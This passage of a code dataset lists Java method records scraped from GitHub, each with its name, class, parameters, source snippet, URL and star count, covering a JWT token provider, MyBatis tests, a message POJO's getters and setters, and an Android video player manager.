"stars": "2", "class_props": {"extends": null, "implements": ["InitializingBean"], "modifiers": ["public"]}}, {"id": 57802, "method_name": "createToken", "class_name": "TokenProvider", "params": ["Authentication", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String createToken(Authentication authentication, boolean rememberMe) {\n        String authorities = authentication.getAuthorities().stream()\n            .map(GrantedAuthority::getAuthority)\n            .collect(Collectors.joining(\",\"));\n\n        long now = (new Date()).getTime();\n        Date validity;\n        if (rememberMe) {\n            validity = new Date(now + this.tokenValidityInMillisecondsForRememberMe);\n        } else {\n            validity = new Date(now + this.tokenValidityInMilliseconds);\n        }\n\n        return Jwts.builder()\n            .setSubject(authentication.getName())\n            .claim(AUTHORITIES_KEY, authorities)\n            .signWith(key, SignatureAlgorithm.HS512)\n            .setExpiration(validity)\n            .compact();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/security/jwt/TokenProvider.java", "stars": "2", "class_props": {"extends": null, "implements": ["InitializingBean"], "modifiers": ["public"]}}, {"id": 57803, "method_name": "getAuthentication", "class_name": "TokenProvider", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Authentication", "snippet": "    public Authentication getAuthentication(String token) {\n        Claims claims = Jwts.parser()\n            .setSigningKey(key)\n            .parseClaimsJws(token)\n            .getBody();\n\n        Collection<? extends GrantedAuthority> authorities =\n            Arrays.stream(claims.get(AUTHORITIES_KEY).toString().split(\",\"))\n                .map(SimpleGrantedAuthority::new)\n                .collect(Collectors.toList());\n\n        User principal = new User(claims.getSubject(), \"\", authorities);\n\n        return new UsernamePasswordAuthenticationToken(principal, token, authorities);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/security/jwt/TokenProvider.java", "stars": "2", "class_props": {"extends": null, "implements": ["InitializingBean"], "modifiers": ["public"]}}, {"id": 57804, "method_name": "validateToken", "class_name": "TokenProvider", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean validateToken(String authToken) {\n        try {\n            Jwts.parser().setSigningKey(key).parseClaimsJws(authToken);\n            return true;\n        } catch (JwtException | IllegalArgumentException e) {\n            log.info(\"Invalid JWT token.\");\n            log.trace(\"Invalid JWT token trace.\", e);\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/security/jwt/TokenProvider.java", "stars": "2", "class_props": {"extends": null, "implements": ["InitializingBean"], "modifiers": ["public"]}}, {"id": 57805, "method_name": "setup", "class_name": "AutodiscoverTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setup() throws Exception {\n    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/autodiscover/MapperConfig.xml\")) {\n      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/autodiscover/AutodiscoverTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57806, "method_name": "testTypeAlias", "class_name": "AutodiscoverTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testTypeAlias() {\n    TypeAliasRegistry typeAliasRegistry = sqlSessionFactory.getConfiguration().getTypeAliasRegistry();\n    typeAliasRegistry.resolveAlias(\"testAlias\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/autodiscover/AutodiscoverTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57807, "method_name": "testTypeHandler", "class_name": "AutodiscoverTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testTypeHandler() {\n    TypeHandlerRegistry typeHandlerRegistry = sqlSessionFactory.getConfiguration().getTypeHandlerRegistry();\n    assertTrue(typeHandlerRegistry.hasTypeHandler(BigInteger.class));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/autodiscover/AutodiscoverTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57808, "method_name": "testMapper", "class_name": "AutodiscoverTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testMapper() {\n    assertTrue(sqlSessionFactory.getConfiguration().hasMapper(DummyMapper.class));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/autodiscover/AutodiscoverTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57809, "method_name": "getMsgId", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMsgId() {\n        return msgId;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57810, "method_name": "setMsgId", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsgId(String msgId) {\n        this.msgId = msgId == null ? null : msgId.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57811, "method_name": "getMsgName", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMsgName() {\n        return msgName;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57812, "method_name": "setMsgName", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsgName(String msgName) {\n        this.msgName = msgName == null ? null : msgName.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57813, "method_name": "getTopic", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTopic() {\n        return topic;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57814, "method_name": "setTopic", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTopic(String topic) {\n        this.topic = topic == null ? null : topic.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57815, "method_name": "getQueneName", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getQueneName() {\n        return queneName;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57816, "method_name": "setQueneName", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setQueneName(String queneName) {\n        this.queneName = queneName == null ? null : queneName.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57817, "method_name": "getMsgContent", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMsgContent() {\n        return msgContent;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57818, "method_name": "setMsgContent", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsgContent(String msgContent) {\n        this.msgContent = msgContent == null ? null : msgContent.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57819, "method_name": "getMsgStatus", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMsgStatus() {\n        return msgStatus;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57820, "method_name": "setMsgStatus", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsgStatus(String msgStatus) {\n        this.msgStatus = msgStatus == null ? null : msgStatus.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57821, "method_name": "getMsgDStatus", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMsgDStatus() {\n        return msgDStatus;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57822, "method_name": "setMsgDStatus", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsgDStatus(String msgDStatus) {\n        this.msgDStatus = msgDStatus == null ? null : msgDStatus.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57823, "method_name": "getRetryCounts", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getRetryCounts() {\n        return retryCounts;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57824, "method_name": "setRetryCounts", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRetryCounts(String retryCounts) {\n        this.retryCounts = retryCounts == null ? null : retryCounts.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57825, "method_name": "getCheckUrl", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCheckUrl() {\n        return checkUrl;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57826, "method_name": "setCheckUrl", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCheckUrl(String checkUrl) {\n        this.checkUrl = checkUrl == null ? null : checkUrl.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57827, "method_name": "getCheckTimeout", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCheckTimeout() {\n        return checkTimeout;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57828, "method_name": "setCheckTimeout", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCheckTimeout(String checkTimeout) {\n        this.checkTimeout = checkTimeout == null ? null : checkTimeout.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57829, "method_name": "getCheckDuration", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCheckDuration() {\n        return checkDuration;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57830, "method_name": "setCheckDuration", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCheckDuration(String checkDuration) {\n        this.checkDuration = checkDuration == null ? null : checkDuration.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57831, "method_name": "getCreateMsgUid", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCreateMsgUid() {\n        return createMsgUid;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57832, "method_name": "setCreateMsgUid", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateMsgUid(String createMsgUid) {\n        this.createMsgUid = createMsgUid == null ? null : createMsgUid.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57833, "method_name": "getCreateMsgTime", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getCreateMsgTime() {\n        return createMsgTime;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57834, "method_name": "setCreateMsgTime", "class_name": "TKMessage", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateMsgTime(Date createMsgTime) {\n        this.createMsgTime = createMsgTime;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57835, "method_name": "getUpdateMsgUid", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUpdateMsgUid() {\n        return updateMsgUid;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57836, "method_name": "setUpdateMsgUid", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUpdateMsgUid(String updateMsgUid) {\n        this.updateMsgUid = updateMsgUid == null ? null : updateMsgUid.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57837, "method_name": "getUpdateMsgTime", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getUpdateMsgTime() {\n        return updateMsgTime;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57838, "method_name": "setUpdateMsgTime", "class_name": "TKMessage", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUpdateMsgTime(Date updateMsgTime) {\n        this.updateMsgTime = updateMsgTime;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57839, "method_name": "getConfirmMsgTime", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getConfirmMsgTime() {\n        return confirmMsgTime;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57840, "method_name": "setConfirmMsgTime", "class_name": "TKMessage", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setConfirmMsgTime(Date confirmMsgTime) {\n        this.confirmMsgTime = confirmMsgTime;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57841, "method_name": "getResendMsgUid", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getResendMsgUid() {\n        return resendMsgUid;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57842, "method_name": "setResendMsgUid", "class_name": "TKMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setResendMsgUid(String resendMsgUid) {\n        this.resendMsgUid = resendMsgUid == null ? null : resendMsgUid.trim();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57843, "method_name": "getResendMsgTime", "class_name": "TKMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getResendMsgTime() {\n        return resendMsgTime;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57844, "method_name": "setResendMsgTime", "class_name": "TKMessage", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setResendMsgTime(Date resendMsgTime) {\n        this.resendMsgTime = resendMsgTime;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-pojo/src/main/java/com/kingge/rtm/pojo/TKMessage.java", "stars": "13", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57845, "method_name": "getMediaPlayer", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IMediaPlayer", "snippet": "    public IMediaPlayer getMediaPlayer() {\n        return mediaPlayer;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57846, "method_name": "initVideoPlayer", "class_name": "SystemPlayerManager", "params": ["Context", "Message", "List<VideoOptionModel>", "ICacheManager"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initVideoPlayer(Context context, Message msg, List<VideoOptionModel> optionModelList, ICacheManager cacheManager) {\n        this.context = context.getApplicationContext();\n        mediaPlayer = new AndroidMediaPlayer();\n        mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);\n        release = false;\n        GSYModel gsyModel = (GSYModel) msg.obj;\n        try {\n            if (gsyModel.isCache() && cacheManager != null) {\n                cacheManager.doCacheLogic(context, mediaPlayer, gsyModel.getUrl(), gsyModel.getMapHeadData(), gsyModel.getCachePath());\n            } else {\n                mediaPlayer.setDataSource(context, Uri.parse(gsyModel.getUrl()), gsyModel.getMapHeadData());\n            }\n            mediaPlayer.setLooping(gsyModel.isLooping());\n            if (gsyModel.getSpeed() != 1 && gsyModel.getSpeed() > 0) {\n                setSpeed(gsyModel.getSpeed());\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        initSuccess(gsyModel);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57847, "method_name": "showDisplay", "class_name": "SystemPlayerManager", "params": ["Message"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showDisplay(Message msg) {\n        if (msg.obj == null && mediaPlayer != null && !release) {\n            mediaPlayer.setSurface(null);\n        } else if (msg.obj != null) {\n            Surface holder = (Surface) msg.obj;\n            surface = holder;\n            if (mediaPlayer != null && holder.isValid() && !release) {\n                mediaPlayer.setSurface(holder);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57848, "method_name": "setSpeed", "class_name": "SystemPlayerManager", "params": ["float", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSpeed(float speed, boolean soundTouch) {\n        setSpeed(speed);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57849, "method_name": "setNeedMute", "class_name": "SystemPlayerManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNeedMute(boolean needMute) {\n        try {\n            if (mediaPlayer != null && !release) {\n                if (needMute) {\n                    mediaPlayer.setVolume(0, 0);\n                } else {\n                    mediaPlayer.setVolume(1, 1);\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57850, "method_name": "releaseSurface", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void releaseSurface() {\n        if (surface != null) {\n            //surface.release();\n            surface = null;\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57851, "method_name": "release", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void release() {\n        if (mediaPlayer != null) {\n            release = true;\n            mediaPlayer.release();\n        }\n        lastTotalRxBytes = 0;\n        lastTimeStamp = 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57852, "method_name": "getBufferedPercentage", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getBufferedPercentage() {\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57853, "method_name": "getNetSpeed", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getNetSpeed() {\n        if (mediaPlayer != null) {\n            return getNetSpeed(context);\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57854, "method_name": "setSpeedPlaying", "class_name": "SystemPlayerManager", "params": ["float", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSpeedPlaying(float speed, boolean soundTouch) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57855, "method_name": "start", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void start() {\n        if (mediaPlayer != null) {\n            mediaPlayer.start();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57856, "method_name": "stop", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stop() {\n        if (mediaPlayer != null) {\n            mediaPlayer.stop();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57857, "method_name": "pause", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pause() {\n        if (mediaPlayer != null) {\n            mediaPlayer.pause();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57858, "method_name": "getVideoWidth", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoWidth() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.getVideoWidth();\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57859, "method_name": "getVideoHeight", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoHeight() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.getVideoHeight();\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": 